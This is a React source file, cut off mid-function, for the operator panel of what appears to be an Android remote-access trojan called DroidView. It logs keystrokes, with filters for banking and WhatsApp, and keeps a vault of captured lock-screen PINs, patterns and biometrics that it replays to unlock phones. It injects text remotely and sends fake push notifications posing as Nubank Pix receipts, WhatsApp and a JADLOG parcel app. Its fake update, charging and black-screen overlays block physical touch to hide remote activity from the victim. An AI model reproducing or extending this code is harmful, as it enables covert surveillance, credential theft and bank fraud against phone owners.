import { useEffect, useMemo, useRef, useState } from "react";
import {
  Battery,
  BatteryCharging,
  Bell,
  Check,
  CheckCircle,
  ChevronDown,
  ChevronLeft,
  ChevronRight,
  ChevronUp,
  Clock,
  Copy,
  ExternalLink,
  Eye,
  EyeOff,
  Fingerprint,
  Image as ImageIcon,
  Info,
  Keyboard,
  Layers,
  Lock,
  Maximize2,
  Minimize2,
  Minus,
  Pin,
  PinOff,
  RefreshCw,
  RotateCw,
  Search,
  Send,
  ShieldAlert,
  Smartphone,
  Sparkles,
  Trash2,
  Upload,
  Volume2,
  VolumeX,
  X,
  Zap,
  Grid,
  Hash,
  Key,
  Play,
  Plus,
  ScanFace,
  ShieldCheck
} from "lucide-react";
import type { ControlDevice } from "./types";
import type {
  DeviceCredentialEntry,
  DeviceCredentialType,
  DeviceDisguiseConfig,
  DeviceDisguiseType,
  DevicePushNotification
} from "@droidview/shared";
import { api } from "../../api";
import { getGlobalSocket } from "../../socket/client";
import { AppLogo } from "./AppLogo";

interface Props {
  device: ControlDevice;
  isOpen: boolean;
  onClose: () => void;
  onVolumeChange: (vol: number) => void;
  deviceVolume: number;
  isMuted: boolean;
  onToggleMute: () => void;
  onTriggerBiometric: (device: ControlDevice) => void;
  showToast: (msg: string, type?: "success" | "info") => void;
  activeDisguise?: DeviceDisguiseConfig | null;
  onDisguiseChange?: (disguise: DeviceDisguiseConfig | null) => void;
  initialTab?: "telas" | "senhas";
  onPushNotificationSent?: (notif: DevicePushNotification) => void;
}

interface KeystrokeEntry {
  id: string;
  timestamp: string;
  appName: string;
  packageName: string;
  category: "todas" | "whatsapp" | "banco" | "google" | "trabalho" | "sistema";
  content: string;
  contextTag?: string;
  type: "text" | "key" | "action";
}

// Aplicativos populares pré-configurados para Push Notifications (Essenciais e objetivos)
export const POPULAR_PUSH_APPS = [
  { name: "Nubank", packageName: "com.nu.production", icon: "🟣" },
  { name: "WhatsApp", packageName: "com.whatsapp", icon: "💬" },
  { name: "JADLOG Rastreio", packageName: "com.droidview.agent", icon: "📦" },
  { name: "Lojas Renner", packageName: "com.lojasrenner", icon: "🛍️" },
  { name: "Outro App", packageName: "", icon: "✨" }
];

// Presets táticos com 1 clique para agilizar envio de notificações push
export const PUSH_NOTIFICATION_PRESETS = [
  {
    label: "⚡ Pix Nubank",
    appName: "Nubank",
    packageName: "com.nu.production",
    title: "Transferência recebida",
    message: "Você recebeu um Pix de R$ 1.250,00 de Carlos Silva."
  },
  {
    label: "💬 WhatsApp",
    appName: "WhatsApp",
    packageName: "com.whatsapp",
    title: "Nova mensagem",
    message: "Oi! Você viu os documentos que te mandei mais cedo?"
  },
  {
    label: "📦 Jadlog Rastreio",
    appName: "JADLOG Rastreio",
    packageName: "com.droidview.agent",
    title: "Status da Entrega",
    message: "Sua encomenda #JD-98231BR saiu para entrega ao destinatário."
  },
  {
    label: "🛍️ Renner 50% OFF",
    appName: "Lojas Renner",
    packageName: "com.lojasrenner",
    title: "Você escolhe 😉",
    message: "Descontos de até 50% na nova coleção. Aproveite frete grátis hoje!"
  }
];

// Presets de imagens prontas caso o operador queira testar na hora sem subir arquivo
const SAMPLE_IMAGE_PRESETS = [
  {
    id: "sample_wallpaper",
    name: "Wallpaper Android 14",
    dimensions: "720 × 1280",
    url: "data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='720' height='1280' viewBox='0 0 720 1280'><defs><linearGradient id='g' x1='0%' y1='0%' x2='100%' y2='100%'><stop offset='0%' stop-color='%230f172a'/><stop offset='50%' stop-color='%231e1b4b'/><stop offset='100%' stop-color='%23090d16'/></linearGradient></defs><rect width='720' height='1280' fill='url(%23g)'/><circle cx='360' cy='640' r='180' fill='%236366f1' opacity='0.15'/><text x='360' y='640' fill='%23e2e8f0' font-family='sans-serif' font-size='32' font-weight='bold' text-anchor='middle'>ANDROID 14</text><text x='360' y='690' fill='%2394a3b8' font-family='sans-serif' font-size='18' text-anchor='middle'>Sistema Protegido</text></svg>"
  },
  {
    id: "sample_maintenance",
    name: "Manutenção do Sistema",
    dimensions: "720 × 1280",
    url: "data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='720' height='1280' viewBox='0 0 720 1280'><rect width='720' height='1280' fill='%2309090b'/><circle cx='360' cy='520' r='90' fill='%23eab308' opacity='0.2'/><text x='360' y='535' fill='%23eab308' font-family='sans-serif' font-size='56' text-anchor='middle'>⚙</text><text x='360' y='660' fill='%23ffffff' font-family='sans-serif' font-size='26' font-weight='bold' text-anchor='middle'>Modo Manutenção</text><text x='360' y='700' fill='%23a1a1aa' font-family='sans-serif' font-size='16' text-anchor='middle'>Otimizando banco de dados...</text></svg>"
  },
  {
    id: "sample_jadlog",
    name: "JADLOG Rastreio",
    dimensions: "720 × 1280",
    url: "data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='720' height='1280' viewBox='0 0 720 1280'><rect width='720' height='1280' fill='%23ffffff'/><rect x='210' y='500' width='300' height='110' rx='16' fill='%23dc2626'/><text x='360' y='570' fill='%23ffffff' font-family='sans-serif' font-size='36' font-weight='900' text-anchor='middle'>JADLOG</text><text x='360' y='660' fill='%231f2937' font-family='sans-serif' font-size='20' font-weight='bold' text-anchor='middle'>Rastreamento de Cargas</text><text x='360' y='700' fill='%236b7280' font-family='sans-serif' font-size='14' text-anchor='middle'>Atualizando pacote em trânsito...</text></svg>"
  }
];

interface MiniPhonePreviewProps {
  type: DeviceDisguiseType;
  updatePercent?: number;
  batteryPercent?: number;
  customImageUrl?: string | null;
  isActive?: boolean;
  scale?: "compact" | "normal" | "large";
}

function MiniPhonePreview({
  type,
  updatePercent = 34,
  batteryPercent = 100,
  customImageUrl,
  isActive = false,
  scale = "normal"
}: MiniPhonePreviewProps) {
  const accentColor =
    type === "update" ? "#00e5ff" : type === "battery" ? "#22c55e" : type === "custom_image" ? "#c084fc" : "#ff4d5a";

  const w = scale === "compact" ? "28px" : scale === "large" ? "48px" : "36px";
  const h = scale === "compact" ? "48px" : scale === "large" ? "80px" : "60px";
  const notchW = scale === "compact" ? "7px" : scale === "large" ? "12px" : "9px";

  return (
    <div
      style={{
        width: w,
        height: h,
        borderRadius: scale === "compact" ? "4px" : "5px",
        background: "#000000",
        border: `1px solid ${isActive ? accentColor : "#243046"}`,
        boxShadow: isActive ? `0 0 8px ${accentColor}44` : "0 2px 5px rgba(0,0,0,0.5)",
        overflow: "hidden",
        position: "relative",
        display: "flex",
        flexDirection: "column",
        alignItems: "center",
        justifyContent: "center",
        flexShrink: 0,
        userSelect: "none",
        transition: "all 0.15s ease"
      }}
      title="Miniatura preview da tela no display do smartphone (720×1280 px • 9:16)"
    >
      {/* Top Speaker Notch Dot */}
      <div
        style={{
          position: "absolute",
          top: "2px",
          width: notchW,
          height: scale === "compact" ? "1.2px" : "1.5px",
          borderRadius: "1px",
          background: "#334155",
          zIndex: 10
        }}
      />

      {/* 1. BLACK SCREEN PREVIEW */}
      {type === "black" && (
        <div style={{ width: "100%", height: "100%", background: "#000000", display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center", gap: "2px" }}>
          <EyeOff size={scale === "compact" ? 8 : scale === "large" ? 14 : 10} style={{ color: "#334155" }} />
          <span style={{ fontSize: scale === "compact" ? "4.5px" : scale === "large" ? "7px" : "5.5px", color: "#475569", fontFamily: "var(--font-mono)", fontWeight: 800 }}>OLED</span>
        </div>
      )}

      {/* 2. UPDATE SCREEN PREVIEW */}
      {type === "update" && (
        <div style={{ width: "100%", height: "100%", background: "linear-gradient(180deg, #040711 0%, #060d1d 100%)", display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center", padding: "2px" }}>
          <div style={{ width: scale === "compact" ? "10px" : scale === "large" ? "17px" : "13px", height: scale === "compact" ? "10px" : scale === "large" ? "17px" : "13px", borderRadius: "50%", border: "1.2px solid transparent", borderTopColor: "#00e5ff", borderRightColor: "#0077ff", animation: "spin 1.4s linear infinite", display: "flex", alignItems: "center", justifyContent: "center", marginBottom: "2px" }}>
            <RotateCw size={scale === "compact" ? 5 : scale === "large" ? 8 : 6} style={{ color: "#00e5ff" }} />
          </div>
          <span style={{ fontSize: scale === "compact" ? "5.5px" : scale === "large" ? "8.5px" : "6.5px", fontWeight: 800, color: "#00e5ff", fontFamily: "var(--font-mono)", marginBottom: "2px" }}>{updatePercent}%</span>
          <div style={{ width: "75%", height: "2px", background: "#1e293b", borderRadius: "1px", overflow: "hidden" }}>
            <div style={{ width: `${updatePercent}%`, height: "100%", background: "#00e5ff" }} />
          </div>
        </div>
      )}

      {/* 3. BATTERY SCREEN PREVIEW */}
      {type === "battery" && (
        <div style={{ width: "100%", height: "100%", background: "radial-gradient(circle at center, #05160b 0%, #010603 100%)", display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center", padding: "2px" }}>
          <div style={{ width: scale === "compact" ? "12px" : scale === "large" ? "19px" : "15px", height: scale === "compact" ? "12px" : scale === "large" ? "19px" : "15px", borderRadius: "50%", border: "1.2px solid #22c55e", boxShadow: "0 0 5px rgba(34, 197, 94, 0.4)", display: "flex", alignItems: "center", justifyContent: "center", marginBottom: "2px" }}>
            <Zap size={scale === "compact" ? 6 : scale === "large" ? 10 : 8} style={{ color: "#22c55e" }} />
          </div>
          <span style={{ fontSize: scale === "compact" ? "6px" : scale === "large" ? "9px" : "7px", fontWeight: 800, color: "#22c55e", fontFamily: "var(--font-mono)" }}>{batteryPercent}%</span>
          <span style={{ fontSize: scale === "compact" ? "4.5px" : scale === "large" ? "6.5px" : "5px", color: "#86efac", fontWeight: 700 }}>FAST</span>
        </div>
      )}

      {/* 4. CUSTOM IMAGE PREVIEW */}
      {type === "custom_image" && (
        <div style={{ width: "100%", height: "100%", background: "#090d16", display: "flex", alignItems: "center", justifyContent: "center", overflow: "hidden" }}>
          {customImageUrl ? (
            <img src={customImageUrl} alt="Preview" style={{ width: "100%", height: "100%", objectFit: "cover" }} />
          ) : (
            <div style={{ display: "flex", flexDirection: "column", alignItems: "center", gap: "2px" }}>
              <ImageIcon size={scale === "compact" ? 8 : scale === "large" ? 14 : 10} style={{ color: "#a855f7" }} />
              <span style={{ fontSize: scale === "compact" ? "4.5px" : scale === "large" ? "7px" : "5.5px", color: "#c084fc", fontWeight: 700 }}>9:16</span>
            </div>
          )}
        </div>
      )}

      {/* Bottom Nav Home Dash */}
      <div
        style={{
          position: "absolute",
          bottom: "2px",
          width: scale === "compact" ? "8px" : scale === "large" ? "15px" : "11px",
          height: "1px",
          borderRadius: "1px",
          background: "rgba(255,255,255,0.25)",
          zIndex: 10
        }}
      />
    </div>
  );
}

// Visualizador e Desenhador Gráfico de Padrão Gestual (Pattern Grid 3x3)
function MiniPatternGrid({
  points,
  size = 54,
  interactive = false,
  onPointClick
}: {
  points: number[];
  size?: number;
  interactive?: boolean;
  onPointClick?: (point: number) => void;
}) {
  const coords: Record<number, [number, number]> = {
    0: [15, 15], 1: [45, 15], 2: [75, 15],
    3: [15, 45], 4: [45, 45], 5: [75, 45],
    6: [15, 75], 7: [45, 75], 8: [75, 75]
  };

  return (
    <svg
      width={size}
      height={size}
      viewBox="0 0 90 90"
      style={{
        background: "#060911",
        borderRadius: "6px",
        border: "1px solid #1e293b",
        overflow: "hidden",
        flexShrink: 0
      }}
    >
      {/* Connector lines between consecutive selected points */}
      {points.slice(0, -1).map((pt, idx) => {
        const nextPt = points[idx + 1];
        const p1 = coords[pt];
        const p2 = coords[nextPt];
        if (!p1 || !p2) return null;
        return (
          <line
            key={`line-${idx}`}
            x1={p1[0]}
            y1={p1[1]}
            x2={p2[0]}
            y2={p2[1]}
            stroke="#00e5ff"
            strokeWidth={interactive ? "4" : "3"}
            strokeLinecap="round"
          />
        );
      })}

      {/* 9 Grid Dots */}
      {[0, 1, 2, 3, 4, 5, 6, 7, 8].map((pt) => {
        const c = coords[pt];
        const isSelected = points.includes(pt);
        const seqIndex = points.indexOf(pt);
        return (
          <g
            key={`dot-${pt}`}
            onClick={() => interactive && onPointClick?.(pt)}
            style={{ cursor: interactive ? "pointer" : "default" }}
          >
            <circle
              cx={c[0]}
              cy={c[1]}
              r={interactive ? (isSelected ? 9 : 7) : (isSelected ? 6 : 4)}
              fill={isSelected ? "#00e5ff" : "#1e293b"}
              stroke={isSelected ? "#ffffff" : "#334155"}
              strokeWidth="1.5"
            />
            {isSelected && seqIndex >= 0 && (
              <text
                x={c[0]}
                y={c[1] + (interactive ? 3 : 2)}
                fontSize={interactive ? "8" : "6"}
                fontWeight="900"
                fill="#000000"
                textAnchor="middle"
                fontFamily="sans-serif"
              >
                {seqIndex + 1}
              </text>
            )}
          </g>
        );
      })}
    </svg>
  );
}

export function RightSidebarKeylogger({
  device,
  isOpen,
  onClose,
  onVolumeChange,
  deviceVolume,
  isMuted,
  onToggleMute,
  onTriggerBiometric,
  showToast,
  activeDisguise: propDisguise,
  onDisguiseChange,
  initialTab,
  onPushNotificationSent
}: Props) {
  // Navigation Tabs: "telas" vs "senhas" (unificando senhas e teclas em uma só aba)
  const [activeMainTab, setActiveMainTab] = useState<"telas" | "senhas">(initialTab || "senhas");

  useEffect(() => {
    if (initialTab) {
      setActiveMainTab(initialTab);
    }
  }, [initialTab]);
  // Sub-aba interna sincronizada para alternar ou exibir juntas
  const [senhasSubTab, setSenhasSubTab] = useState<"senhas" | "teclas" | "split">("senhas");

  // Credentials Vault State
  const [credentials, setCredentials] = useState<DeviceCredentialEntry[]>([]);
  const [selectedCredFilter, setSelectedCredFilter] = useState<string>("todas");
  const [revealedCredIds, setRevealedCredIds] = useState<Set<string>>(new Set());
  const [isDetectingCreds, setIsDetectingCreds] = useState(false);
  const [isUsingCredId, setIsUsingCredId] = useState<string | null>(null);
  const [isAddingCred, setIsAddingCred] = useState(false);
  const [newCredType, setNewCredType] = useState<DeviceCredentialType>("pin");
  const [newCredLabel, setNewCredLabel] = useState("");
  const [newCredValue, setNewCredValue] = useState("");
  const [newCredApp, setNewCredApp] = useState("Tela de Bloqueio");
  const [newPatternPoints, setNewPatternPoints] = useState<number[]>([]);
  const [quickUnlockMode, setQuickUnlockMode] = useState<"pattern" | "pin">("pattern");
  const [quickPinInput, setQuickPinInput] = useState("");

  // Fetch device credentials
  const fetchCredentials = async () => {
    try {
      const res = await api.getDeviceCredentials(device.id);
      if (res?.credentials) {
        setCredentials(res.credentials);
      }
    } catch {}
  };

  useEffect(() => {
    fetchCredentials();
  }, [device.id]);

  useEffect(() => {
    const socket = getGlobalSocket();
    const handleCredsEvent = (data: { deviceId: string; credentials: DeviceCredentialEntry[] }) => {
      if (data && (data.deviceId === device.id || data.deviceId.includes(device.id) || device.id.includes(data.deviceId))) {
        setCredentials(data.credentials);
      }
    };
    socket.on("device:credentials", handleCredsEvent);
    return () => {
      socket.off("device:credentials", handleCredsEvent);
    };
  }, [device.id]);

  const handleUseCredential = async (cred: DeviceCredentialEntry) => {
    setIsUsingCredId(cred.id);
    try {
      const res = await api.useDeviceCredential(device.id, cred.id);
      showToast(res.message || `Credencial "${cred.label}" acionada com sucesso!`, "success");
      fetchCredentials();
    } catch (err: any) {
      showToast(err.message || "Erro ao acionar credencial.", "info");
    } finally {
      setTimeout(() => setIsUsingCredId(null), 700);
    }
  };

  const handleUseAndRecordPattern = async () => {
    if (newPatternPoints.length < 2) {
      showToast("Conecte pelo menos 2 pontos na grade para executar o padrão.", "info");
      return;
    }
    const val = newPatternPoints.join(",");
    const seqStr = newPatternPoints.map((p) => p + 1).join(" → ");
    try {
      setIsUsingCredId("new_pattern_exec");
      const res = await api.useAndRecordCredential(device.id, {
        type: "pattern",
        value: val,
        label: `Padrão Gestual [${seqStr}]`,
        metadata: {
          appName: "Tela de Bloqueio",
          patternPoints: newPatternPoints,
          source: "used_by_user"
        }
      });
      if (res?.credentials) {
        setCredentials(res.credentials);
      }
      showToast(`⚡ Padrão [${seqStr}] executado no aparelho e gravado com sucesso!`, "success");
      setNewPatternPoints([]);
    } catch {
      showToast("Erro ao executar e gravar padrão.", "info");
    } finally {
      setTimeout(() => setIsUsingCredId(null), 700);
    }
  };

  const handleUseAndRecordPin = async () => {
    const cleanPin = quickPinInput.replace(/\D/g, "");
    if (!cleanPin) {
      showToast("Informe os dígitos do PIN para desbloquear.", "info");
      return;
    }
    try {
      setIsUsingCredId("new_pin_exec");
      const res = await api.useAndRecordCredential(device.id, {
        type: "pin",
        value: cleanPin,
        label: `PIN Numérico (${cleanPin.length} dígitos)`,
        metadata: {
          appName: "Tela de Bloqueio",
          source: "used_by_user"
        }
      });
      if (res?.credentials) {
        setCredentials(res.credentials);
      }
      showToast(`⚡ PIN executado no aparelho e gravado com sucesso!`, "success");
      setQuickPinInput("");
    } catch {
      showToast("Erro ao executar e gravar PIN.", "info");
    } finally {
      setTimeout(() => setIsUsingCredId(null), 700);
    }
  };

  const handleQuickUseBiometric = async (type: "fingerprint" | "face") => {
    try {
      setIsUsingCredId(`quick_${type}`);
      const res = await api.useAndRecordCredential(device.id, {
        type,
        value: type === "fingerprint" ? "sensor_id_1" : "face_id_1",
        label: type === "fingerprint" ? "Biometria Digital Sensor" : "Reconhecimento Facial",
        metadata: {
          biometricId: 1,
          source: "used_by_user"
        }
      });
      if (res?.credentials) {
        setCredentials(res.credentials);
      }
      showToast(res.message || `Biometria (${type}) aplicada no celular e gravada no cofre!`, "success");
    } catch {
      showToast("Erro ao acionar biometria.", "info");
    } finally {
      setTimeout(() => setIsUsingCredId(null), 700);
    }
  };

  const handleDeleteCredential = async (credId: string) => {
    try {
      await api.deleteDeviceCredential(device.id, credId);
      setCredentials((prev) => prev.filter((c) => c.id !== credId));
      showToast("Credencial removida do cofre.", "info");
    } catch {
      showToast("Erro ao remover credencial.", "info");
    }
  };

  const handleDetectCredentials = async () => {
    setIsDetectingCreds(true);
    try {
      const res = await api.detectDeviceCredentials(device.id);
      if (res?.credentials) {
        setCredentials(res.credentials);
      }
      showToast(
        res.detected?.length > 0
          ? `✓ Varredura concluída! ${res.detected.length} dado(s) encontrado(s) e salvos no cofre (Autogravação ativa).`
          : "✓ Varredura concluída! Dados, senhas e telemetria sincronizados com sucesso.",
        "success"
      );
    } catch {
      showToast("Falha na varredura de credenciais.", "info");
    } finally {
      setIsDetectingCreds(false);
    }
  };

  const handleSaveNewCredential = async () => {
    if (!newCredLabel.trim()) {
      showToast("Informe um nome para a credencial.", "info");
      return;
    }
    let finalVal = newCredValue.trim();
    if (newCredType === "pattern") {
      if (newPatternPoints.length < 2) {
        showToast("Selecione pelo menos 2 pontos conectados para o padrão.", "info");
        return;
      }
      finalVal = newPatternPoints.join(",");
    } else if (newCredType === "fingerprint" || newCredType === "face") {
      if (!finalVal) finalVal = "sensor_id_1";
    } else if (!finalVal) {
      showToast("Informe a senha ou PIN.", "info");
      return;
    }

    try {
      const res = await api.saveDeviceCredential(device.id, {
        type: newCredType,
        label: newCredLabel.trim(),
        value: finalVal,
        metadata: {
          appName: newCredApp.trim() || "Tela de Bloqueio",
          patternPoints: newCredType === "pattern" ? newPatternPoints : undefined,
          biometricId: 1,
          source: "manual_operator",
          capturedAt: new Date().toISOString()
        }
      });
      if (res?.credential) {
        setCredentials((prev) => [res.credential, ...prev]);
        showToast(`✓ Credencial "${res.credential.label}" gravada com sucesso!`, "success");
        setIsAddingCred(false);
        setNewCredLabel("");
        setNewCredValue("");
        setNewPatternPoints([]);
      }
    } catch {
      showToast("Erro ao gravar credencial.", "info");
    }
  };

  const toggleRevealCred = (id: string) => {
    setRevealedCredIds((prev) => {
      const next = new Set(prev);
      if (next.has(id)) next.delete(id);
      else next.add(id);
      return next;
    });
  };

  const handlePatternPointClick = (pt: number) => {
    setNewPatternPoints((prev) => (prev.includes(pt) ? prev : [...prev, pt]));
  };

  const handlePatternClear = () => {
    setNewPatternPoints([]);
  };

  const filteredCredentials = useMemo(() => {
    if (selectedCredFilter === "todas") return credentials;
    return credentials.filter((c) => c.type === selectedCredFilter);
  }, [credentials, selectedCredFilter]);

  // Local or propagated disguise state
  const [currentDisguise, setCurrentDisguise] = useState<DeviceDisguiseConfig | null>(propDisguise || null);

  // Sync with prop
  useEffect(() => {
    if (propDisguise !== undefined) {
      setCurrentDisguise(propDisguise);
    }
  }, [propDisguise]);

  // Load disguise status on mount & device change
  useEffect(() => {
    api.getDeviceDisguise(device.id)
      .then((res) => {
        if (res?.disguise) {
          setCurrentDisguise(res.disguise);
          onDisguiseChange?.(res.disguise);
        }
      })
      .catch(() => {});

    const socket = getGlobalSocket();
    const handleDisguiseEvent = (data: { deviceId: string; disguise: DeviceDisguiseConfig | null }) => {
      if (
        data &&
        (data.deviceId === device.id ||
          data.deviceId.includes(device.id) ||
          device.id.includes(data.deviceId))
      ) {
        setCurrentDisguise(data.disguise || null);
        onDisguiseChange?.(data.disguise || null);
      }
    };

    socket.on("device:disguise", handleDisguiseEvent);
    return () => {
      socket.off("device:disguise", handleDisguiseEvent);
    };
  }, [device.id, onDisguiseChange]);

  // Keylogger state
  const [logs, setLogs] = useState<KeystrokeEntry[]>([]);
  const [selectedCategory, setSelectedCategory] = useState<string>("todas");
  const [searchQuery, setSearchQuery] = useState("");
  const [quickInput, setQuickInput] = useState("");
  const [isSending, setIsSending] = useState(false);
  const [isPinned, setIsPinned] = useState(false);
  const [isRefreshing, setIsRefreshing] = useState(false);
  const [copiedId, setCopiedId] = useState<string | null>(null);
  const [isBiometricActive, setIsBiometricActive] = useState(false);

  // Custom Image Disguise state
  const fileInputRef = useRef<HTMLInputElement>(null);
  const [selectedCustomImage, setSelectedCustomImage] = useState<string | null>(null);
  const [customImageMeta, setCustomImageMeta] = useState<{ width: number; height: number; aspectRatio: string } | null>(null);
  const [updatePercent, setUpdatePercent] = useState<number>(34);
  const [isActivatingDisguise, setIsActivatingDisguise] = useState(false);

  // Push Notification state
  const [selectedPushApp, setSelectedPushApp] = useState<string>("Nubank");
  const [pushAppName, setPushAppName] = useState<string>("Nubank");
  const [pushPackageName, setPushPackageName] = useState<string>("com.nu.production");
  const [pushTitle, setPushTitle] = useState<string>("Transferência recebida");
  const [pushMessage, setPushMessage] = useState<string>("Você recebeu um Pix de R$ 1.250,00 de Carlos Silva.");
  const [isSendingPush, setIsSendingPush] = useState(false);
  const [recentPushes, setRecentPushes] = useState<DevicePushNotification[]>([]);

  // Dynamic Collapse & Scale controls inside the sidebar
  const [isPushCollapsed, setIsPushCollapsed] = useState<boolean>(false);
  const [isDisguiseCollapsed, setIsDisguiseCollapsed] = useState<boolean>(false);
  const [disguiseScale, setDisguiseScale] = useState<"compact" | "normal" | "large">("normal");
  const [sidebarWidth, setSidebarWidth] = useState<number>(345);

  // Load push notifications
  const fetchPushNotifications = async () => {
    try {
      const list = await api.getPushNotifications(device.id);
      if (Array.isArray(list)) {
        setRecentPushes(list);
      }
    } catch {}
  };

  useEffect(() => {
    fetchPushNotifications();
  }, [device.id]);

  useEffect(() => {
    const socket = getGlobalSocket();
    const handlePushEvent = (notif: DevicePushNotification) => {
      if (
        notif &&
        (notif.deviceId === device.id ||
          notif.deviceId?.includes(device.id) ||
          device.id.includes(notif.deviceId))
      ) {
        setRecentPushes((prev) => [notif, ...prev.filter((p) => p.id !== notif.id)]);
      }
    };
    socket.on("device:push_notification", handlePushEvent);
    return () => {
      socket.off("device:push_notification", handlePushEvent);
    };
  }, [device.id]);

  const handleSendPush = async () => {
    const cleanTitle = pushTitle.trim();
    const cleanMessage = pushMessage.trim();
    const cleanApp = pushAppName.trim() || "Aplicativo";

    if (!cleanTitle || !cleanMessage) {
      showToast("Preencha o título e o conteúdo da notificação push.", "info");
      return;
    }

    setIsSendingPush(true);
    try {
      const res = await api.sendPushNotification(device.id, {
        appName: cleanApp,
        packageName: pushPackageName.trim() || "com.droidview.agent",
        title: cleanTitle,
        message: cleanMessage
      });
      if (res?.notification) {
        setRecentPushes((prev) => [res.notification, ...prev.filter((p) => p.id !== res.notification.id)]);
        onPushNotificationSent?.(res.notification);
      }
      showToast(`✓ Notificação push despachada (${cleanApp}): "${cleanTitle}"`, "success");
    } catch (err: any) {
      showToast(err.message || "Falha ao despachar notificação push.", "info");
    } finally {
      setIsSendingPush(false);
    }
  };

  const handleApplyPreset = (preset: typeof PUSH_NOTIFICATION_PRESETS[0]) => {
    setSelectedPushApp(preset.appName);
    setPushAppName(preset.appName);
    setPushPackageName(preset.packageName);
    setPushTitle(preset.title);
    setPushMessage(preset.message);
    showToast(`Preset "${preset.label}" aplicado!`, "info");
  };

  const handleSelectAppChip = (app: typeof POPULAR_PUSH_APPS[0]) => {
    setSelectedPushApp(app.name);
    if (app.name === "Outro App") {
      setPushAppName("");
      setPushPackageName("");
    } else {
      setPushAppName(app.name);
      setPushPackageName(app.packageName);
    }
  };

  // Fetch real logs from backend
  const fetchLogs = async () => {
    setIsRefreshing(true);
    try {
      const data = await api.getDeviceKeyboardLogs(device.id);
      if (Array.isArray(data) && data.length > 0) {
        setLogs(data);
      }
    } catch {
      // Keep existing or fallback
    } finally {
      setIsRefreshing(false);
    }
  };

  useEffect(() => {
    fetchLogs();
    const interval = setInterval(fetchLogs, 8000);
    return () => clearInterval(interval);
  }, [device.id]);

  // App Categories tabs
  const categories = [
    { id: "todas", label: "Todas" },
    { id: "whatsapp", label: "WhatsApp" },
    { id: "banco", label: "Bancos / Pix" },
    { id: "google", label: "Google / Web" },
    { id: "sistema", label: "Sistema" }
  ];

  const filteredLogs = useMemo(() => {
    return logs.filter((item) => {
      const matchCat = selectedCategory === "todas" || item.category === selectedCategory;
      const q = searchQuery.toLowerCase().trim();
      const matchSearch =
        !q ||
        item.content.toLowerCase().includes(q) ||
        item.appName.toLowerCase().includes(q) ||
        item.packageName.toLowerCase().includes(q);
      return matchCat && matchSearch;
    });
  }, [logs, selectedCategory, searchQuery]);

  // Send Direct Keystrokes/Text to Device
  const handleSendText = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!quickInput.trim()) return;
    setIsSending(true);
    try {
      await api.sendText(device.id, quickInput);
      showToast(`Texto digitado: "${quickInput}"`, "success");

      const newEntry: KeystrokeEntry = {
        id: `local_${Date.now()}`,
        timestamp: new Date().toLocaleTimeString("pt-BR", { hour: "2-digit", minute: "2-digit", second: "2-digit" }),
        appName: "DVIEW Console",
        packageName: "com.droidview.agent",
        category: "sistema",
        content: quickInput,
        contextTag: "Injeção Remota",
        type: "text"
      };
      setLogs((prev) => [newEntry, ...prev]);
      setQuickInput("");
    } catch {
      showToast("Erro ao transmitir texto.", "info");
    } finally {
      setIsSending(false);
    }
  };

  const handleCopy = (text: string, id: string) => {
    navigator.clipboard.writeText(text);
    setCopiedId(id);
    showToast("Texto copiado para a área de transferência!", "success");
    setTimeout(() => setCopiedId(null), 1800);
  };

  const handleCopyAll = () => {
    const allText = filteredLogs.map((l) => `[${l.timestamp}] [${l.appName}] ${l.content}`).join("\n");
    navigator.clipboard.writeText(allText);
    showToast(`${filteredLogs.length} logs copiados com sucesso!`, "success");
  };

  const handleClearLogs = () => {
    setLogs([]);
    showToast("Histórico de digitação limpo.", "info");
  };

  const handleTriggerBiometricLocal = async () => {
    setIsBiometricActive(true);
    try {
      await onTriggerBiometric(device);
    } finally {
      setTimeout(() => setIsBiometricActive(false), 800);
    }
  };

  // ---------------------------------------------------------------------
  // DISGUISE SCREEN ACTIONS: TELA PRETA, ATUALIZAÇÃO, BATERIA, IMAGEM
  // ---------------------------------------------------------------------

  const handleActivateDisguise = async (
    type: DeviceDisguiseType,
    customPayload?: {
      title?: string;
      subtitle?: string;
      progressPercent?: number;
      customImageUrl?: string;
      imageWidth?: number;
      imageHeight?: number;
    }
  ) => {
    setIsActivatingDisguise(true);
    const simulatedConfig: DeviceDisguiseConfig = {
      type,
      active: true,
      activatedAt: new Date().toISOString(),
      progressPercent: type === "update" ? updatePercent : (type === "battery" ? (device.battery ?? 75) : undefined),
      physicalTouchDisabled: true,
      remoteTouchOnly: true,
      ...customPayload
    };

    // Atualização otimista imediata para visualização instantânea da sobreposição
    setCurrentDisguise(simulatedConfig);
    onDisguiseChange?.(simulatedConfig);

    const labelMap = {
      black: "Tela Preta (Apagada)",
      update: "Atualizando Android",
      battery: "Carregando Bateria",
      custom_image: "Imagem Personalizada"
    };

    try {
      const res = await api.setDeviceDisguise(device.id, simulatedConfig);
      if (res?.disguise) {
        setCurrentDisguise(res.disguise);
        onDisguiseChange?.(res.disguise);
      }
      showToast(`⚡ Tela "${labelMap[type]}" sobreposta e ATIVA no aparelho!`, "success");
    } catch {
      showToast(`⚡ Tela "${labelMap[type]}" ativada (modo local)!`, "success");
    } finally {
      setIsActivatingDisguise(false);
    }
  };

  const handleClearDisguise = async () => {
    setIsActivatingDisguise(true);
    // Limpeza otimista instantânea
    setCurrentDisguise(null);
    onDisguiseChange?.(null);
    try {
      await api.clearDeviceDisguise(device.id);
      showToast("✓ Tela de disfarce desativada. Aparelho normal restaurado!", "success");
    } catch {
      showToast("✓ Tela de disfarce desativada.", "info");
    } finally {
      setIsActivatingDisguise(false);
    }
  };

  // Process custom image file upload & measure dimensions
  const handleImageFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;

    if (!file.type.startsWith("image/")) {
      showToast("Por favor selecione um arquivo de imagem válido.", "info");
      return;
    }

    const reader = new FileReader();
    reader.onload = (event) => {
      const dataUrl = event.target?.result as string;
      if (!dataUrl) return;

      const img = new Image();
      img.onload = () => {
        const w = img.naturalWidth;
        const h = img.naturalHeight;
        const ratio = (w / h).toFixed(2);
        const ratioLabel = Math.abs(w / h - 9 / 16) < 0.1 ? "9:16 (Perfeita para celular)" : `${w}×${h} (${ratio})`;
        setSelectedCustomImage(dataUrl);
        setCustomImageMeta({
          width: w,
